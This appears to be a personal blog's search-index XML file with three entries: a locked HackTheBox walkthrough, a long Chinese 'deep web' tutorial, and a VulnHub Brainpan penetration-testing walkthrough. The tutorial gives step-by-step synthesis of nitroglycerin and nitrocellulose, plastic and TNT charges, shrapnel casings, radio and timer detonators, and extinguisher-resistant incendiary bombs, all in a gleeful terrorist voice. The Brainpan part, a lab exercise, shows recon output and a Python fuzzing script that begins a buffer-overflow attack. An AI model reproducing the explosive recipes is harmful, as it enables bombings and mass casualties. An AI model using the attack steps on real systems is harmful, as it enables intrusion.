<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hack-The-Box-walkthrough[blunder]</title>
    <url>/2020/06/05/blunder/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the users.php pass hash</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="990dbe670cf1e4b1a5bccebf7ffac034a86397a52eae9b9d5e7e23427b11e2ad"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>炸药制造(deep web)</title>
    <url>/2019/02/06/bomb-deep-web/</url>
    <content><![CDATA[<h3 id="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："><a href="#从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：" class="headerlink" title="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："></a>从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：</h3><p><strong><em>原料:</em></strong><font color="red">滴管，玻璃杯两个，碳酸钠（俗称苏达），浓硝酸，浓硫酸，甘油，这些都能在化学药品商店买到，当然为了避免暴露身份，比较推荐的方法是到中学化学实验室里面去偷，一盆水，不需要太满，一个搪瓷茶缸，最好还有温度计，注意家里用来量体温的温度计是不能用的，一是量程不够用，二来是体温计的特性在温度到达最高点之后除非用手甩，否则水银柱不会下降，那么您很有可能就此为了伟大事业献身。最后推荐ph试纸，当然可以用普通酸碱指示剂替代。</font></p>
<a id="more"></a>

<p><strong><em>步骤:</em></strong></p>
<p>1、在一个玻璃杯中加上大概80毫升的水</p>
<p>2、在另一个玻璃杯中除加上80毫升水外，基本添上一平勺碳酸钠，所谓的勺子是指不锈钢的西式餐勺，如果使用中式的汤匙那就差很多了。配成碳酸钠溶液。</p>
<p>3、好,现在是时候将一个搪瓷茶缸放入水盆中了，然后缓慢（注意）加入8~10毫升左右的浓硝酸，用温度计测量温度，要到20度以下。差点忘记说了，冬季可能比较容易，夏秋季节的话，呵呵，那还是准备一些冰块吧。之所以那么低的温度是浓硝酸在高温下分解极快。</p>
<p>4、慢慢地加入22~28毫升的浓硫酸，也要注意，速度慢，温度要保持住，绝不能再高了。有条件使用冰块的还要低一些。5、用滴管把甘油滴到混合物上，速度要慢，每分钟大概4、5滴就差不多了。而且还是那句话，温度绝对不能上升，否则您很容易就去见马克思了。一直要滴到甘油在混合物表面形成甘油层为止。</p>
<p>6、在低温下用筷子搅拌一刻钟。筷子用完以后千万不要再用它吃饭了。完毕后把混合物缓慢倒入蒸馏水的杯子中。硝酸甘油比重较大，会沉底。而且由于折射率的不同，两种液体分层后，两种液体的分界线还是比较容易分辨的。</p>
<p>7、把下层的硝酸甘油滴到碳酸钠溶液中，目的是为了去除多余的酸，因为酸性的硝酸溶液氧化性非常强。是极其危险的。至于够不够到中性，就要依靠您的酸碱指示剂了。</p>
<p>　　制作完了之后，千万要注意不要振荡摇晃。如果那样的话——向毛主席保证，您一定会见到他老人家。如果您想试验一下它的威力的话也不是不可以，通常可以取一个小玻璃药瓶，注满硝化甘油之后，从高楼上任它自由落体，你会明白什么叫做东京轰炸的威力缩小版。</p>
<p>　　另外您要明确一个的概念是，炸药和炸弹是有区别的。瞧，我们手上已经有了炸药，但是它还称不上是一个炸弹。我们辛辛苦苦制造出来的“宝贝”，如果一不小心就会要了我们的命，当然我们恐怖分子并不害怕为了伟大的事业献身，但是壮志未酬身先死未免太可惜了。每天要提心吊胆会多么严重的挫伤我们的积极性啊。</p>
<p>　　下一步的加工首先是要让它变得稳定，通常，稳定硝化甘油的方法少说也有100种，最流行的恐怕就硝酸甘油和硝酸钾、硝化棉、木粉填料、矿脂、活性碳粉混合在一起。当年伟大的诺贝尔先生就是靠这玩意一举成为大富翁，还创立了大名鼎鼎的诺贝尔奖为世界科学作出了巨大的贡献。当然现在我们作为他的后人也不能甘于其后啊。</p>
<p>　　扯远了，刚才的方法是比较流行的，但是并不是唯一的，般来说，把硝化甘油和挥发性低的次级炸药、粘结剂、填充料等加上其他乱七八糟的东西混合在一起基本可以满意。为了体现每个圣战者的个性，您可以随意选择配料，比如面粉，鸡蛋，蜂蜜奶油，冰激凌等等等等。我个人的偏好是以胡椒粉为主，用方便面的面块固定（版权所有，盗版必究）。</p>
<p>　　如果您制造的硝化甘油数量比较大的话，那么您就无需费神考虑弹体了，一个普通公事包或者旅行包完全可以满足您的一切要求——携带方便，高雅大方。特别推荐皮尔卡丹的，它不透气。把固态的炸药要往里面一填就可以了。不过您制造的剂量不若不够大，那么无疑好的弹体能令您事半功倍。一个普通市民想要得到手榴弹形状的铁质部件不太可能，建议您diy，不知您对以前的雀巢咖啡瓶子是否有印象，那就是一个不错的弹体。重要的是如果您想锦上添花的话，您可以用蚀刻玻璃的方法将表面划成几百个小块，什么？你不知道如何蚀刻？那么用玻璃刀也可以。当然您还可以在上面画一些花纹来表示您的高雅情趣。形成独特的艺术流派什么的。不过别忘了把他的头部塑料瓶口部分用胶带也好什么也好紧紧封起来，以便玻璃瓶体能够顺利破成弹片。再给您一个狠主意，如果您要对付的对象是十恶不赦天怒人怨或者和您有不共戴天之仇的话，还记得前面的填充剂吗？您可以把它改成铝热剂，也就是所谓铝粉和氧化铁粉的混合制剂。当爆破的时候由于高温，将会使铁铝发生反应，变成氧化铝和炽热铁水（亮白色）而四散飞溅！杀伤力极强，如果您有非凡的目力，您会看到真正的飞火流星！注：可能性不大。</p>
<p>最后就是引爆系统，用一根药捻子的导火索无疑是会令同行耻笑的，我目前有两个备选方案。</p>
<p>1、用对讲机的无线电系统，把一个拆下来之后，会得到一个共频系统，将其中一个制造成短路情况安装在炸弹上，然后用其他一些见电火花即可燃烧的炸药放在一起。这样一来就可以实现通话——短路——火花——引爆药点燃——炸药爆炸的遥控。当然无线电话是更好的选择，播一个号码就可以爆炸，简直就是《间接伤害》的翻版。不过缺点是成本高。而且还要担心串频走火还有某个不识时务的混蛋给你打电话，那可真是死不瞑目了。</p>
<p>2、定时系统，也很简单，普通的电子闹钟就可以胜任。手法和上面的差不多。不过，你一定要有准时的习惯，表也得很准，呵呵。</p>
<p>　　好了，本讲座就到这里，祝你好运。如果各位有兴趣的话，我还会继续推出其他制作讲座，比如很受各位喜爱的tnt，塑胶炸弹，燃耗弹等等特殊要求的炸弹。</p>
<p>　　上一讲我们已经谈了硝化甘油炸弹的制作方法，但是除了硬碰硬的纯大威力杀伤炸弹之外，相信不少同道也曾碰到有一些特殊需要的局面。这一讲就是专门论述这种炸弹。</p>
<p>　　作为恐怖分子，毫无疑问业界c4是最大名鼎鼎。但是c4既不是威力最大的，也不是制作最简单的，之所以如此广泛应用最大原因就是它便于隐藏和运输。否则在海关被fbi扣住可实在是太丢面子了。c4主要成分是环三甲撑、三硝胺、甲撑和润滑油。另外一个优点就是可以附着在物体表面，可以对目标最脆弱的部分攻击从而达到一击即中的效果。</p>
<p>　　与之具有同样性质的东西我估计就数本人的最爱——rdx了，它是c4的提炼物，或用六甲撑四胺和丙酮净化过的硝酸混合制成。我的记忆中它可以和淀粉、面粉、洗衣粉等等家居用品混合而不遭受怀疑。当然你要是愿意，白粉也可以。更可怕的是他可以和面粉、鸡蛋、蜂蜜、香精等等制作成饼干，曲奇等等绝对杀人于无形。一旦需要，只要把它用一些挥发性液体泡湿然后捏实就可使用，实在是居家旅行，杀人灭口之必备良药。嘿嘿。但是他的成分都是比较难以得到的东东。所以各位也只能望料兴叹了。</p>
<p>　　好了，再次回到我们的问题上来，那么有可塑性的炸药就真的没有办法制作了吗？不是的，这就需要我们来发挥创造力了，本人经过多年潜心研究日思夜想终于在睡梦中发掘了一个成本低廉制作简单的可塑炸弹制作方法（门捷列夫？），啪啪啪（鼓掌，山呼海啸般的万岁声）！c4，rdx本身具有多种性质，但是我们在某个用途总可以得到用某个替代品，同时也可以依靠混合物使某些炸药附带上其他性质。也就是说我们只需要把不可塑的炸药和一些可塑的合剂杂糅在一起就可以了，最简单地说，把汽油和面粉揉在一起，就可以使汽油具有可塑性和粘着性（恐怖的汽油面团？）。好了首先我们要确定分散质是什么。我比较推荐的硝化棉，学名叫作三硝酸纤维酯。这玩意的出现大大促进了现代枪炮的发展，后来我们的同行——法国炸药工程师p?维埃利于1884年，诺贝尔先生于1887年，分别以不同的方式改进，造成了无烟火药，至今仍然应用于枪弹、炮弹发射药领域，威胁着几十亿人的生命~~呵呵。</p>
<h3 id="好了言归正转，制作方法如下："><a href="#好了言归正转，制作方法如下：" class="headerlink" title="好了言归正转，制作方法如下："></a>好了言归正转，制作方法如下：</h3><p><strong><em>原料：</em></strong>浓硝酸（百分之六十几那种），浓硫酸（98%），药用棉花（药品商店里面多的是），容器自备。</p>
<p>1、将浓硝酸和浓硫酸以体积比一比二配成混合溶液。注意要慢和冷，搅拌均匀，详细说明在我上一次写的炸弹制作教程已经写得很清楚了。如果您需要指导我可以另外给您一份操作手册，当然价格嘛～</p>
<p>2、将药用脱脂棉浸入混合溶液中，要浸透。想想着这是你的仇人现在要把他泡到酸里去，嘿嘿。</p>
<p>3、小资：泡杯咖啡，慢慢享用。看段芭蕾舞。</p>
<p>情歌王子：把“你是疯儿我是傻”唱上四五遍。</p>
<p>李宁第二：做俯卧撑，引体向上仰卧起坐等等。</p>
<p>瘾君子：尽量离远一些再抽烟，否则我不能对您的生命安全负责。</p>
<p>4、看着时间到20分，请大喊一声“大功告成”，然后以迅雷不及掩耳盗铃之势将那块棉花取出。</p>
<p>5、用水冲洗干净。请确定是中性。</p>
<p>6、摊平棉花，在一个风和日丽万里无云万物滋长的合适时机放到阳台上晒干。7、收工<del>~</del></p>
<p>差点忘记对您说，做炸药的时候嘴上千万不要叼着烟。什么？您已经殉职了？请允许我对您表示沉重的哀悼。：（</p>
<p>　　接下来就要看您的用途是什么了，如果您只是做普通备用炸药，那就压实，封包，比较直接的方法就是用报纸包起来用重物压好，最后外面用黄色的宽胶带纸层封好加上足够长的导火索即可。一般可以呈扁平形状，当然其实你可以选择其他的形状也可以。它适合在比较狭窄的地方爆破。把很窄的缝隙分离开来。</p>
<p>　　我相信您在对付一些门锁的时候，曾经想过用炸药炸开，这种时候相信您会考虑塑胶型炸药，制作也很简单，把刚才做好的硝化棉溶解在乙醇和乙醚里面，加上树脂之类的东西来调节它的粘稠度。必要时可以添加类似口香糖之类的树脂，制造成口香糖炸弹，酷～～相信007式的情节在您手中再现一定令您激动不已吧，呵呵。</p>
<p>　　但是事实上我并不推荐用乙醚来制作这玩意儿，因为乙醚是一种全身麻醉剂，浸透毛巾后捂住口鼻可以使人在短时间内失去知觉，至于怎么个短法……，我没试验过，从电视里面大概是几秒钟吧。总之有很大的用途。</p>
<p>　　另外一种还是我们的偶像诺贝尔先生发明的，把硝化棉和硝化甘油（制作方法上次讲过）混合，添加树酯等等可以作成胶质炸弹。威力更大，更重要的是在热气下可以压成绳状，那么物理性质应该类似于加工过程中的方便面，呵呵。通常来说，为了避免伤及无辜，请您在郊外盖间茅屋，以响应我佛慈悲的大无畏精神啊。阿门。</p>
<p>　　最后推荐的是比较有艺术气息的用品了，请我们缪斯女神的化身－－tnt登场！！（闪光灯唰唰，掌声如雷）！可能您会有疑问，tnt如何和艺术挂钩呢？这取决于它的一个性质，在摄氏大概185度左右，它会熔化。到时候可以浇铸成任何形状。您想必也知道可以用石膏和腊作人像等，但是您有没有想过用tnt那么前卫的材料作艺术品呢？到时候您大可以向中央美术学院借几个维纳斯的模子。浇铸一个tnt维纳斯！如果喜欢也可以铸大卫。那将无论如何是后现代艺术的杰作，哈哈哈哈。</p>
<p>　　上一讲我们讲了一些特种爆破炸弹的制作方法，现在让我们把眼睛从炸弹上移开，把注意力调整到燃烧弹上来。有人说“学习二战找个啤酒瓶子装上汽油，塞个布头，用火机一点，轰！整个世界就平静了！”（俗称莫罗托夫鸡尾酒）。不客气地说一句，如果用文明史来打比方的话，这也就处于周口店的水平。我这篇文章好歹进步到文艺复兴了，至于说什么电气化，信息化，我们还差得远呢。古人曰，学无止境，难道在这么个水平你就满足了？那可真是缺乏进取心。另外，燃烧弹是不会有轰的声音的，最多就是玻璃瓶子碎掉的呯。好了，书归正转，开讲。</p>
<p>同学们好！（老师好！）</p>
<p>　　要讲讲如何制作性能优良，质量上乘的燃烧弹，首先要弄清楚几个概念，怎样才是一个性能优良的燃烧弹。燃烧值高，燃烧温度高固然是一个重要方面，还有更重要的包括燃烧速度，和抗灭火能力，以及必要的附加性质和杀伤能力等等。</p>
<p>　　无论从哪个角度说，单纯使用汽油作的燃烧弹都是三流中的三流货色。从前段时间某些自焚人士的实践表明，在一个消防体系完备的环境中，纯汽油根本无法起到高效的杀伤作用。</p>
<p>　　汽油的燃烧值是无需怀疑的，但是燃烧值高并不意味着燃烧温度就高。大家可能知道，大部分所谓易燃物质如酒精等都不能在液态下直接燃烧，我们所点燃的都是挥发到空气中的蒸汽，他们必须以气态才能够与氧气充分混合燃烧。燃烧的火焰提高温度加速液体挥发，燃烧才能进行。这一方面浪费了大量的气化热，一方面也限制了燃烧温度。其实很多江湖卖艺的都会做一种表演：将手泡到酒精中后取出点燃，可以看到手上的淡蓝色火焰，看似惊险其实没有什么奥秘，更不会对人体造成伤害，他们甚至能够感觉手上凉飕飕的，只要有胆量，大部分人都可以作。提高温度通常会在汽油中添加一些燃剂，就我个人而言可能是添加镁粉或者铝热剂，普通火焰温度是几百度，以这种添加剂可以达到一千度，一千五百度，高的可能接近两千度。不但加大杀伤力和引燃能力，也可以大大加快燃剂挥发速度。</p>
<p>　　除了提高温度，抗灭火能力也是极其重要的，很多人有一种根深蒂固的观念，火焰总是会被灭火器扑灭的，事实上，燃烧弹在灭火措施面前不仅不是任人宰割的，有的时候甚至能反客为主令灭火措施完全失效。最简单反灭火手段莫过于大大加快燃烧速度，在对方还没有来得及作出反应的时候就结束，或者把火势放大到不可收拾的地步。上面的镁粉就是一种，高温下汽油挥发燃烧速度起码加快两倍。其次就是抗灭火器了，目前比较广泛应用的是水，二氧化碳的泡沫灭火器，干粉灭火器等等。这些灭火器的工作原理是降温，隔绝空气中的氧气，和干扰火焰中的活性基团结合等等。这些都是可以避开的，首先是水，不能用水来灭油类火灾是常识，所以我们通常不会碰到，即使碰到了，不但加速火势蔓延，还可能因为镁在热水中生成氢氧化镁放出氢气，在爆炸极限浓度中甚至可以产生爆炸，我们求之不得。嘿嘿，接下来是二氧化碳灭火剂，那就更有意思了，不广为人所知的一件事情是，镁不仅能够在空气中燃烧，它还可以在二氧化碳中燃烧！放出大量的热然后变为氧化镁和碳，至于碳作用也不小，它是呈微粒的粉状，在有水情况下可能会产生水煤气，也就是一氧化碳和氢气的混合物，无水情况下也可以不完全燃烧成一氧化碳，或者回到老家去变成二氧化碳。总之即使燃烧 ，也可能产生有毒气体。最后是对付干粉灭火器，干粉灭火器的原理是产生大量小微粒以干粉形式喷到火焰上，干扰活性基团的结合，从而灭火。这就回到了燃烧的本质问题上来了，燃烧作为一种比较剧烈的氧化还原反应，空气中的氧气是比较常见的氧化剂，但绝对不是唯一的，必要时甚至可以自备氧化剂。通常的硝酸、硝酸钾和浓硫酸都是相当不错的，这样一来就彻底消除了以隔绝空气的灭火手段。</p>
<p>　　最后就是黏着能力的问题，很多时候我们的目标是倾斜或者垂直的平面，如果用汽油很可能会流光而无法达到效果，通常可以使用橡胶溶剂来调节粘稠度。做法是把橡胶（尽量选择天然的）切成小块，溶解到汽油中即可。</p>
<p>　　好了，现在出现了两种思路。第一种就是高温快速派的，方法是橡胶溶解汽油中添加碱液、镁粉、铝热剂、油脂、松香、蛋清、肥皂、石蜡和甚至动物血。这些材料的不是必要的，属于可选范围，比例和配方自定，它的特点是温度高，粘着性很强，燃烧迅速。还有炽热的铁水和镁氧化辅助。基本上无法扑灭也来不及扑灭。性质与军方使用的胶凝汽油差不多。引燃系统我推荐是把一两块干净的钠用薄的药棉裹好贴在瓶子表面，这样一来，一旦瓶子被扔出破裂，钠和瓶内的一些水份及有机物接触，就会发生反应放热和氢气，点燃燃烧弹。千万不要和我谈什么拿打火机点布条之类的手段，传出去都不好意思见人。</p>
<p>　　另一种思路则是，同样是橡胶汽油，但是添加的是浓硫酸、硝酸钾、木工的锯末和少量研碎石蜡，这里要注意的是，浓硫酸占的体积分数可以到10%左右。它的特点是自带氧化剂，所以可以抗许多灭火器材，甚至还有一定的爆炸能力。扑灭的可能性比前者还要低。基本碰上就是神仙也无救。引燃系统就比较多种多样了，前者的棉花裹钠仍然可以使用，其次就是在表面贴上一层在氯化钾、糖，混合溶液中浸泡过晾干的纸。瓶子一破，硫酸与这些成分接触就会燃烧起来。好像还有一种就是在溶液中添加高锰酸钾，缺点是不稳定，容易走火。还有一点就是要尽量保证燃烧液中没有水分，因为有水分的话，浓硫酸会产生氢离子，使硝酸钾变为酸性，比较危险。</p>
<p>　　当然咯，以一个完美主义者的态度来看，两个燃烧弹合在一起是最好的，但是不能够直接混合，因为一个酸性一个碱性，如果可以的话，二个瓶子装捆在一起无疑是非常好的，基本就是无所畏惧的超级燃烧弹了。哈哈哈。</p>
<p>　　除这些以外，您也可以添加一些其他的东西，比如建筑上使用的松节油，油漆，其他的如塑料袋等，可以产生浓重的黑烟和刺激性气体和少量毒性，干扰灭火人。</p>
<p>　　最后再给您一个狠主意，如果您有一点点铀却又不足以到达临界质量制作原子弹的话，那么大可以添加到这里来，产生的高温足以将其液化甚至少量气化，除了杀伤救火人员之外，其下风方向会产生一定的核沾染，基本就属于灭绝人性的法子了。</p>
<p>　　最后向各位说明的是，制作炸弹也好，燃烧弹也罢，既不是高精尖科技，也不是一个捻子一个雷式的土法生产。他需要化学，物理，结构力学，材料力学，医学，甚至日常生活方面各种的知识。所有人包括我都仅仅处于学习，研究，探索过程中。欢迎各位有兴趣的同学一起来切磋。我们的口号是：“威力无极限！！！” </p>
]]></content>
      <categories>
        <category>制作</category>
      </categories>
      <tags>
        <tag>deep web</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-1]</title>
    <url>/2020/01/26/brainpan-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Brainpan：1<br>发布日期：2013年3月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXA=">https://download.vulnhub.com/brainpan/Brainpan.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXAudG9ycmVudA==">https://download.vulnhub.com/brainpan/Brainpan.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> _               _                         </span><br><span class="line">| |__  _ __ __ _(_)_ __  _ __   __ _ _ __  </span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |</span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|</span></span><br><span class="line"><span class="string">                        |_|                </span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，在任何情况下概不负责任何损失或损害，包括但不限于间接或随之而来的损失或损害，或任何损失或损害因使用引起的或与使用有关的数据或利润损失该软件。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan经过测试，发现可在以下虚拟机监控程序上工作：<br>-VMware Player 5.0.1<br>-VMWare Fusion 5.0<br>-VirtualBox 4.2.8<br>将Brainpan导入首选的虚拟机监控程序并配置网络根据需要进行设置。它会通过DHCP获取IP地址，但是建议在NAT内运行它，或者仅对主机操作系统可见，因为它容易受到攻击。</p>
<p>资料来源：Brainpan.zip/readme.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5（brainpan.ova）= fc0f163220b9884df5dcc9cdc45361e4</span><br></pre></td></tr></table></figure>
<p>资料来源：Brainpan.zip/md5.txtVulnHub独家！</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一顿</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.115</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">MAC Address: 08:00:27:DE:BA:CA (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -v -Pn -sV 192.168.56.115</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<p>访问一下看看是什么东西:</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub189.jpg"></p>
<p>扫一下目录看看</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub190.jpg"></p>
<p>在bin目录中有一个二进制文件？</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub191.jpg"></p>
<p>将这个exe文件下载下来，然后用ollydbug工具调试</p>
<p>调试之前，先分析下brainpan.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># file brainpan.exe </span></span><br><span class="line">brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), <span class="keyword">for</span> MS Windows</span><br><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># strings brainpan.exe </span></span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">.text</span><br><span class="line">`.data</span><br><span class="line">.rdata</span><br><span class="line">@.bss</span><br><span class="line">.idata</span><br><span class="line">[^_]</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">[^_]</span><br><span class="line">[get_reply] s = [%s]</span><br><span class="line">[get_reply] copied %d bytes to buffer</span><br><span class="line">shitstorm</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line">                          &gt;&gt; </span><br><span class="line">                          ACCESS DENIED</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line">[+] initializing winsock...</span><br><span class="line">[!] winsock init failed: %d</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line">[!] could not create socket: %d</span><br><span class="line">[+] server socket created.</span><br><span class="line">[!] <span class="built_in">bind</span> failed: %d</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port %d</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[+] check is %d</span><br><span class="line">[!] accept failed: %d</span><br><span class="line">[+] cleaning up.</span><br><span class="line">-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32</span><br><span class="line">w32_sharedptr-&gt;size == sizeof(W32_EH_SHARED)</span><br><span class="line">../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c</span><br><span class="line">GetAtomNameA (atom, s, sizeof(s)) != 0</span><br><span class="line">AddAtomA</span><br><span class="line">ExitProcess</span><br><span class="line">FindAtomA</span><br><span class="line">GetAtomNameA</span><br><span class="line">SetUnhandledExceptionFilter</span><br><span class="line">__getmainargs</span><br><span class="line">__p__environ</span><br><span class="line">__p__fmode</span><br><span class="line">__set_app_type</span><br><span class="line">_assert</span><br><span class="line">_cexit</span><br><span class="line">_iob</span><br><span class="line">_onexit</span><br><span class="line">_setmode</span><br><span class="line">abort</span><br><span class="line">atexit</span><br><span class="line">free</span><br><span class="line">malloc</span><br><span class="line">memset</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">signal</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">strlen</span><br><span class="line">太多了省略。。。</span><br></pre></td></tr></table></figure>

<p>这里有几个很重要：</p>
<ul>
<li>这个brainpan.exe看起来与端口9999上的侦听过程相同</li>
<li>shitstorm 看起来像密码</li>
<li>strcpy 可能是缓冲区溢出攻击向量</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub192.jpg"></p>
<p>显然，应该尝试可能的密码shitstorm。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.115 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; shitstorm</span><br><span class="line">                          ACCESS GRANTED</span><br></pre></td></tr></table></figure>

<p>返回。<br>嗯…如何检查strcpy函数。<br>虽然有适用于Linux的Evan的Debugger和Immunity Debugger（通过wine执行），但我选择在Windows环境中将Immunity Debugger用于“windozy”类型的任务。</p>
<p>免责声明：对于那些已经知道如何执行简单的strcpy缓冲区溢出的人，可以快速进入下一节，因为这本身就很冗长且“用户友好”。选择为每个步骤包括大量的模糊测试代码和详细信息，以便对这种攻击媒介不熟悉的任何人都可以轻松学习并希望了解该过程。</p>
<p>是时候使用快速模糊器来看看是否可以获取导致段错误的输入。这是经常使用的一些代码，并在进行过程中使用shellcode和register进行修改。简单，有效。</p>
<p>etfuzz.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 1000</span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>是时候运行brainpan.exe并使用Immunity Debugger附加到进程。在Windows机器上侦听该进程的情况下，在端口9999上放置1000个模糊测试（\x41），看看是否遇到段错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

